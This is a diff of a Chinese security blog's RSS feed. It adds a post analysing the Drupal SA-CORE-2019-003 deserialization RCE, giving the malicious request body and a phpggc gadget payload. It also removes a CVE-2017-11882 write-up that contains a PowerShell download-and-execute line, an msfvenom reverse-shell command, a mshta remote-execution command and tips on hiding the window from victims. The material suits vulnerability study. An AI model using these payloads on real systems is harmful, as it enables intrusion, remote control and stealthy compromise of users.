@@ -10,6 +10,173 @@
     <atom:link href="https://kylingit.com/tags/sec/index.xml" rel="self" type="application/rss+xml" />
     
     <item>
+      <title>SA-CORE-2019-003 Drupal 内核远程代码执行漏洞分析</title>
+      <link>https://kylingit.com/blog/sa-core-2019-003-drupal-%E5%86%85%E6%A0%B8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
+      <pubDate>Fri, 22 Feb 2019 22:19:04 +0000</pubDate>
+      
+      <guid>https://kylingit.com/blog/sa-core-2019-003-drupal-%E5%86%85%E6%A0%B8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
+      <description>
+
+&lt;script src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js&#34;&gt;&lt;/script&gt;
+
+&lt;h3 id=&#34;0x01-概述&#34;&gt;0x01 概述&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://www.drupal.org/sa-core-2019-003&#34;&gt;https://www.drupal.org/sa-core-2019-003&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;0x02-影响版本&#34;&gt;0x02 影响版本&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Drupal 8.6.x &amp;lt; 8.6.10&lt;/li&gt;
+&lt;li&gt;Drupal 8.5.x &amp;lt; 8.5.11&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;影响条件&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;站点启用了&lt;code&gt;Drupal 8&lt;/code&gt;核心&lt;code&gt;RESTful&lt;/code&gt; Web服务&lt;code&gt;(rest)&lt;/code&gt;模块，并允许&lt;code&gt;PATCH&lt;/code&gt;或&lt;code&gt;POST&lt;/code&gt;请求&lt;/li&gt;
+&lt;li&gt;站点启用了另一个&lt;code&gt;Web&lt;/code&gt;服务模块，如&lt;code&gt;Drupal 8&lt;/code&gt;中的&lt;code&gt;JSON:API&lt;/code&gt;，或&lt;code&gt;Drupal 7&lt;/code&gt;中的&lt;code&gt;Services&lt;/code&gt;或&lt;code&gt;RESTful Web Services&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;0x03-web-services&#34;&gt;0x03 Web Services&lt;/h3&gt;
+
+&lt;p&gt;Drupal框架的&lt;code&gt;RESTful&lt;/code&gt; Web服务是为了更方便地访问Drupal站点的资源，支持常规的api请求，如GET / POST / PATCH / DELETE（出于一些原因不支持PUT ）&lt;/p&gt;
+
+&lt;p&gt;更详细的介绍可以参考 &lt;a href=&#34;https://www.drupal.org/docs/8/core/modules/rest/overview&#34;&gt;https://www.drupal.org/docs/8/core/modules/rest/overview&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;这个漏洞影响REST Web Services，所以首先在Drupal 8中开启rest服务&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;下载&lt;a href=&#34;https://www.drupal.org/project/restui&#34;&gt;REST UI&lt;/a&gt;并解压至&lt;code&gt;core/modules/&lt;/code&gt;目录&lt;/li&gt;
+&lt;li&gt;在&lt;code&gt;admin-config-extend&lt;/code&gt;勾选Web services中的&lt;code&gt;RESTful Web Services&lt;/code&gt;和&lt;code&gt;REST UI&lt;/code&gt;并安装，drupal会自动安装&lt;code&gt;Serialization&lt;/code&gt; ，最好也安装&lt;code&gt;HAL&lt;/code&gt;扩展，后续会使用&lt;code&gt;hal_json&lt;/code&gt;数据格式&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;HAL(Hypertext Application Language)是一个简单的API数据格式.它以xml和json为基础，让API变的可读性更高，并且具有discoverable的特性.当我们拿到HAL API返回的数据时，我们将会很容易根据当前数据查找与其相关的数据。在Micro Service API设计中，倾向于采用HAL这种类型的数据交换格式.&lt;/p&gt;
+
+&lt;p&gt;HAL的出现，主要弥补plain json在API交互中的不足.让plain json更具有描述性，更具有导航性.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ol&gt;
+&lt;li&gt;开启权限。在&lt;code&gt;admin-config-services-rest&lt;/code&gt;开启匿名用户注册权限&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190222161612.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;0x04-漏洞分析&#34;&gt;0x04 漏洞分析&lt;/h3&gt;
+
+&lt;p&gt;根据补丁位置判断漏洞点在&lt;code&gt;unserialize&lt;/code&gt;部分，因此这是一个反序列化漏洞。补丁主要修复了&lt;code&gt;core/modules/link/src/Plugin/Field/FieldType/LinkItem.php&lt;/code&gt;和&lt;code&gt;core/lib/Drupal/Core/Field/Plugin/Field/FieldType/MapItem.php&lt;/code&gt;两个文件，这两处应该都是能触发的，这里选择&lt;code&gt;LinkItem&lt;/code&gt;进行分析&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190222160822.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190222160859.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;看一下&lt;code&gt;setValue()&lt;/code&gt;方法&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190222161825.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以看到简单判断了&lt;code&gt;$values[&#39;options&#39;]&lt;/code&gt;后直接进行了反序列化，没有进行数据合法性校验，如果能够控制&lt;code&gt;$values[&#39;options&#39;]&lt;/code&gt;就能直接触发漏洞&lt;/p&gt;
+
+&lt;p&gt;接下来梳理一下数据传递过程，以及如何进入到&lt;code&gt;setValue()&lt;/code&gt;方法&lt;/p&gt;
+
+&lt;p&gt;通过rest接口注册用户时，发送的数据包类似这个样子&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190222164151.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;(图片来源：&lt;a href=&#34;https://areatype.com/blog/register-user-drupal-8-rest-api&#34;&gt;https://areatype.com/blog/register-user-drupal-8-rest-api&lt;/a&gt;)&lt;/p&gt;
+
+&lt;p&gt;在进入&lt;code&gt;drupal&lt;/code&gt;后，由&lt;code&gt;RequestHandler-&amp;gt;handle()&lt;/code&gt;方法处理请求，进入&lt;code&gt;deserialize()&lt;/code&gt;方法，然后调用&lt;code&gt;$this-&amp;gt;serializer-&amp;gt;denormalize()&lt;/code&gt;反序列化出相应的类，此时的&lt;code&gt;$unserialized&lt;/code&gt;为&lt;code&gt;Serializer&lt;/code&gt;类&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190222171019.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190222171158.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;随后调用&lt;code&gt;Serializer-&amp;gt;denormalize()&lt;/code&gt;方法，在该方法中首先通过&lt;code&gt;getDenormalizer()&lt;/code&gt;获得一个匹配的&lt;code&gt;denormalizer&lt;/code&gt;，才能进行后续的&lt;code&gt;denormalize()&lt;/code&gt;操作，匹配的过程则是和当前类的&lt;code&gt;supportedInterfaceOrClass&lt;/code&gt;变量比较，返回最终可以进行&lt;code&gt;denormalize()&lt;/code&gt;操作的类&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;if ($normalizer = $this-&amp;gt;getDenormalizer($data, $type, $format, $context)) {
+    return $normalizer-&amp;gt;denormalize($data, $type, $format, $context);
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;此处跟入比较深，可以略过，总之返回匹配的类是&lt;code&gt;ContentEntityNormalizer&lt;/code&gt;，跟进它的&lt;code&gt;denormalize()&lt;/code&gt;方法&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$typed_data_ids = $this-&amp;gt;getTypedDataIds($data[&#39;_links&#39;][&#39;type&#39;], $context);
+$entity_type = $this-&amp;gt;getEntityTypeDefinition($typed_data_ids[&#39;entity_type&#39;]);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;这个方法中根据 &lt;code&gt;_links.type&lt;/code&gt; 的值取出&lt;code&gt;typed data IDs&lt;/code&gt;，&lt;code&gt;_links.type&lt;/code&gt; 值即是&lt;code&gt;post json&lt;/code&gt;部分的
+&lt;code&gt;&amp;quot;type&amp;quot;: {
+      &amp;quot;href&amp;quot;: &amp;quot;http://127.0.0.1/drupal-8.6.5/rest/type/user/user&amp;quot;
+}&lt;/code&gt;
+      值，这个值决定了后面获取到的&lt;code&gt;Entity&lt;/code&gt;实体，通过&lt;code&gt;getTypeInternalIds()&lt;/code&gt;方法取出所有预定义的类型并返回相应的&lt;code&gt;URI&lt;/code&gt;，然后才获取对应的实体类型定义&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190222173004.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;接着会调用这个实体的&lt;code&gt;denormalizeFieldData()&lt;/code&gt;方法，在&lt;code&gt;denormalizeFieldData()&lt;/code&gt;中调用相应的&lt;code&gt;denormalize()&lt;/code&gt;方法，最终调用到这个&lt;code&gt;field_item&lt;/code&gt;的&lt;code&gt;setValue()&lt;/code&gt;。因此为了触发到存在漏洞的&lt;code&gt;setValue()&lt;/code&gt;，我们需要让&lt;code&gt;field_item&lt;/code&gt;为&lt;code&gt;LinkItem&lt;/code&gt;类或者&lt;code&gt;MapItem&lt;/code&gt;类，这个赋值过程在获取到相应实体后的&lt;code&gt;getStorage()-&amp;gt;create()&lt;/code&gt;过程：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$entity = $this-&amp;gt;entityManager-&amp;gt;getStorage($typed_data_ids[&#39;entity_type&#39;])-&amp;gt;create($values);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;调用流程&lt;code&gt;create()-&amp;gt;doCreate()-&amp;gt;initFieldValues()&lt;/code&gt;，此时的调用栈是这样的：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190223102241.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;现在的问题就是找到相应的&lt;code&gt;Entity&lt;/code&gt;，在其中实体化了&lt;code&gt;LinkItem&lt;/code&gt;类或&lt;code&gt;MapItem&lt;/code&gt;类，通过查找，在&lt;code&gt;core/modules&lt;/code&gt;中这样的类有两个，&lt;code&gt;Shortcut&lt;/code&gt;和&lt;code&gt;MenuLinkContent&lt;/code&gt;，这里选择&lt;code&gt;MenuLinkContent&lt;/code&gt;来触发，此时的&lt;code&gt;_links.type&lt;/code&gt;为&lt;code&gt;http://127.0.0.1/drupal-8.6.5/rest/type/menu_link_content/menu_link_conten&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190223103404.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;因此最后的数据包类似这个样子，注意&lt;code&gt;link&lt;/code&gt;必须为数组&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;{
+  &amp;quot;link&amp;quot;: [
+    {
+      &amp;quot;options&amp;quot;: payload
+    }
+  ],
+  &amp;quot;_links&amp;quot;: {
+    &amp;quot;type&amp;quot;: {
+      &amp;quot;href&amp;quot;: &amp;quot;http://127.0.0.1/drupal-8.6.5/rest/type/menu_link_content/menu_link_content&amp;quot;
+    }
+  }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;发送数据包成功触发到&lt;code&gt;setValue()&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190223103837.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;接下来就是寻找内置的风险类了，进入&lt;code&gt;setValue()&lt;/code&gt;后通过&lt;code&gt;unserialize()&lt;/code&gt;执行代码。&lt;/p&gt;
+
+&lt;h3 id=&#34;0x05-poc&#34;&gt;0x05 PoC&lt;/h3&gt;
+
+&lt;p&gt;在之前介绍&lt;code&gt;phpggc&lt;/code&gt;工具的时候总结了&lt;code&gt;Drupal&lt;/code&gt;中存在风险的三个类，分别可以导致远程代码执行、任意文件写入和任意文件删除，这三个类分别是&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;FnStream&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;FileCookieJar&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;WindowsPipes&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;具体参考：&lt;a href=&#34;https://kylingit.com/blog/由phpggc理解php反序列化漏洞/&#34;&gt;由phpggc理解php反序列化漏洞&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;同样地，借助&lt;code&gt;phpggc&lt;/code&gt;直接生成序列化数据：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@localhost:/opt/phpggc# ./phpggc guzzle/rce1 assert &#39;phpinfo()&#39; -j
+&amp;quot;O:24:\&amp;quot;GuzzleHttp\\Psr7\\FnStream\&amp;quot;:2:{s:33:\&amp;quot;\u0000GuzzleHttp\\Psr7\\FnStream\u0000methods\&amp;quot;;a:1:{s:5:\&amp;quot;close\&amp;quot;;a:2:{i:0;O:23:\&amp;quot;GuzzleHttp\\HandlerStack\&amp;quot;:3:{s:32:\&amp;quot;\u0000GuzzleHttp\\HandlerStack\u0000handler\&amp;quot;;s:9:\&amp;quot;phpinfo()\&amp;quot;;s:30:\&amp;quot;\u0000GuzzleHttp\\HandlerStack\u0000stack\&amp;quot;;a:1:{i:0;a:1:{i:0;s:6:\&amp;quot;assert\&amp;quot;;}}s:31:\&amp;quot;\u0000GuzzleHttp\\HandlerStack\u0000cached\&amp;quot;;b:0;}i:1;s:7:\&amp;quot;resolve\&amp;quot;;}}s:9:\&amp;quot;_fn_close\&amp;quot;;a:2:{i:0;r:4;i:1;s:7:\&amp;quot;resolve\&amp;quot;;}}&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;发送payload&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190223111019.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;0x06-总结&#34;&gt;0x06 总结&lt;/h3&gt;
+
+&lt;p&gt;这个漏洞触发点并不复杂，但是调用链相当深，利用条件则是开启了&lt;code&gt;REST Web services&lt;/code&gt;，并且允许用户通过&lt;code&gt;rest api&lt;/code&gt;注册，在一些功能比较齐全的站点或者方便插件调用时可能会开启，影响面减小了不少，但并不影响这依然是个非常巧妙的漏洞，也进一步说明了开发时考虑不周全的话，风险点就在那里，被利用只是时间问题。&lt;/p&gt;
+
+&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
+</description>
+    </item>
+    
+    <item>
       <title>Wordpress Image 远程代码执行漏洞分析</title>
       <link>https://kylingit.com/blog/wordpress-image-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
       <pubDate>Thu, 21 Feb 2019 14:45:49 +0000</pubDate>
@@ -172,11 +339,11 @@
 
 &lt;p&gt;要想在&lt;code&gt;Windows&lt;/code&gt;下利用漏洞，一个技巧是利用&lt;code&gt;#&lt;/code&gt;字符，&lt;code&gt;#&lt;/code&gt;在&lt;code&gt;url&lt;/code&gt;中表示为网页位置指定标识符，只在浏览器中起作用，对解析资源时是忽略后面的字符的，因此在&lt;code&gt;wordpress&lt;/code&gt;中两个方式尝试获取图片资源时同样会出现不一致，导致漏洞产生。&lt;/p&gt;
 
-&lt;h3 id=&#34;0x04-poc&#34;&gt;0x04 PoC&lt;/h3&gt;
+&lt;h3 id=&#34;0x05-poc&#34;&gt;0x05 PoC&lt;/h3&gt;
 
 &lt;p&gt;见上面分析&lt;/p&gt;
 
-&lt;h3 id=&#34;0x05-总结&#34;&gt;0x05 总结&lt;/h3&gt;
+&lt;h3 id=&#34;0x06-总结&#34;&gt;0x06 总结&lt;/h3&gt;
 
 &lt;p&gt;这个漏洞主要成因在于我们可以通过参数传递任意值覆盖数据库中的字段，从而引入&lt;code&gt;../&lt;/code&gt;构成目录穿越，在裁剪图片后保存文件时并没有对文件目录做检查，造成目录穿越漏洞，最终可以写入恶意图片被包含或者通过&lt;code&gt;Imagick&lt;/code&gt;漏洞触发远程代码执行，利用链挺巧妙，值得学习。&lt;/p&gt;
 
@@ -3172,95 +3339,6 @@ rm -rf /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/server
 &lt;p&gt;附
 Github上&lt;a href=&#34;https://github.com/3xp10it/exploit/blob/cbc8d61859b9c4c312bb52225671831b895fdbc3/exps/weblogic/weblogic.py&#34;&gt;3xp10it/exploit&lt;/a&gt;仓库删除的脚本
 &lt;a href=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/others/weblogic.py&#34;&gt;Weblogic.py&lt;/a&gt;&lt;/p&gt;
-
-&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>CVE-2017-11882 复现</title>
-      <link>https://kylingit.com/blog/cve-2017-11882-%E5%A4%8D%E7%8E%B0/</link>
-      <pubDate>Tue, 21 Nov 2017 18:40:29 +0000</pubDate>
-      
-      <guid>https://kylingit.com/blog/cve-2017-11882-%E5%A4%8D%E7%8E%B0/</guid>
-      <description>
-
-&lt;script src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js&#34;&gt;&lt;/script&gt;
-
-&lt;p&gt;上周微软更新日，修复了&lt;code&gt;CVE-2017-11882&lt;/code&gt;这个漏洞，根据官方描述该漏洞为Office内存破坏漏洞，影响目前流行的所有Office版本，攻击者可以利用漏洞以当前登录的用户的身份执行任意命令。漏洞位置是出现在一个公式编辑器上，叫做&lt;code&gt;EQNEDT32.EXE&lt;/code&gt;，在win10上的路径是&lt;code&gt;C:\Program Files\Common Files\microsoft shared\EQUATION\EQNEDT32.EXE&lt;/code&gt;，可以在编辑文档的时候插入公式。&lt;/p&gt;
-
-&lt;p&gt;最近有利用脚本出来了，也是自己尝试复现了几次，在此简单记录一下&lt;/p&gt;
-
-&lt;p&gt;下载&lt;code&gt;https://github.com/Ridter/CVE-2017-11882/&lt;/code&gt;利用脚本，该脚本是&lt;a href=&#34;https://evi1cg.me/archives/CVE_2017_11882_exp.html&#34;&gt;@Evi1cg&lt;/a&gt;改造后的脚本，经过测试效果还是不错的&lt;/p&gt;
-
-&lt;p&gt;生成一个测试文档的话执行
-&lt;code&gt;python Command_CVE-2017-11882.py -c &amp;quot;cmd.exe /c calc.exe&amp;quot; -o test.doc
-&lt;/code&gt;
-打开test.doc就会弹出计算器，而且全程没有提示或警告之类的弹窗，可以算是完美利用，比之前&lt;a href=&#34;https://kylingit.com/blog/msword-code-exec-without-macro/&#34;&gt;不带宏的代码执行&lt;/a&gt;要简单粗暴&lt;/p&gt;
-
-&lt;p&gt;注意一点的是命令部分长度不能超过43bytes&lt;/p&gt;
-
-&lt;h4 id=&#34;反弹shell&#34;&gt;反弹shell&lt;/h4&gt;
-
-&lt;p&gt;下面主要讲一下反弹shell的利用&lt;/p&gt;
-
-&lt;p&gt;用mshta方式执行代码：
-在vps上建立一个文件&lt;code&gt;test&lt;/code&gt;，内容为&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;&amp;lt;HTML&amp;gt; 
-&amp;lt;meta http-equiv=&amp;quot;Content-Type&amp;quot; content=&amp;quot;text/html; charset=utf-8&amp;quot;&amp;gt;
-&amp;lt;HEAD&amp;gt; 
-&amp;lt;script language=&amp;quot;VBScript&amp;quot;&amp;gt;
-Set objShell = CreateObject(&amp;quot;Wscript.Shell&amp;quot;)
-objShell.Run &amp;quot;calc.exe&amp;quot;
-self.close
-&amp;lt;/script&amp;gt;
-&amp;lt;body&amp;gt;
-demo
-&amp;lt;/body&amp;gt;
-&amp;lt;/HEAD&amp;gt; 
-&amp;lt;/HTML&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;关键是修改&lt;code&gt;objShell.Run&lt;/code&gt;后面的部分&lt;/p&gt;
-
-&lt;p&gt;我们通过调用powershell下载一个反弹脚本然后执行的方式来获得shell：&lt;/p&gt;
-
-&lt;p&gt;修改&lt;code&gt;objShell.Run&lt;/code&gt;为&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;objShell.Run powershell.exe -WindowStyle Hidden -NoP -sta -NonI -c IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://ip/reverse.ps1&#39;);reverse.ps1&amp;quot;&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;其中&lt;code&gt;reverse.ps1&lt;/code&gt;通过&lt;code&gt;msfvenom&lt;/code&gt;生成:&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;./msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=1234 -f psh-reflection &amp;gt;reverse.ps1&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;msf开启监听，然后生成word文档：
-&lt;code&gt;python Command_CVE-2017-11882.py -c &amp;quot;mshta http://ip/test&amp;quot; -o test.doc&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;打开之后就会收到shell&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/5TU1y&#34; alt=&#34;test&#34; /&gt;
-&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/KM1My&#34; alt=&#34;session 1&#34; /&gt;
-但是这样会有一个问题，打开word文档的时候会发现有一个黑框一闪而过，而我们已经指定powershell以&lt;code&gt;-WindowStyle Hidden&lt;/code&gt;的方式运行了，那怎么绕过这个黑框呢？&lt;/p&gt;
-
-&lt;p&gt;查一下&lt;a href=&#34;https://msdn.microsoft.com/en-us/library/d5fk67ky(en-us,VS.85).aspx&#34;&gt;文档&lt;/a&gt;
-可以看到&lt;code&gt;Run&lt;/code&gt;命令是可以通过&lt;code&gt;intWindowStyle&lt;/code&gt;参数来控制窗口风格的，有0-10这几种风格
-&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/q0F4b&#34; alt=&#34;Run Method&#34; /&gt;
-所以我们在执行的命令后面加一个参数，用来控制mshta运行的窗口大小，使之最好隐藏窗口运行
-&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/ccxgV&#34; alt=&#34;0&#34; /&gt;
-经过测试0和2参数都是可以的，达到隐藏窗口执行，用户察觉不了，其它参数可以自己试一下&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/qJKq7&#34; alt=&#34;session 3&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;目前这样生成的文档在火绒和360杀毒的最新版上是没有报毒，但是各大杀软已经更新了规则，凡是远程调用执行cmd或者ps或者regsvr32等都会触发报警，暂时没有好的方法绕过，毕竟是监控着底层的那几个文件的。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/fzUuw&#34; alt=&#34;av&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;参考：&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://evi1cg.me/archives/CVE_2017_11882_exp.html&#34;&gt;https://evi1cg.me/archives/CVE_2017_11882_exp.html&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;http://www.freebuf.com/vuls/154462.html&#34;&gt;http://www.freebuf.com/vuls/154462.html&lt;/a&gt;&lt;/p&gt;
 
 &lt;script&gt;pangu.spacingPage();&lt;/script&gt;
 </description>
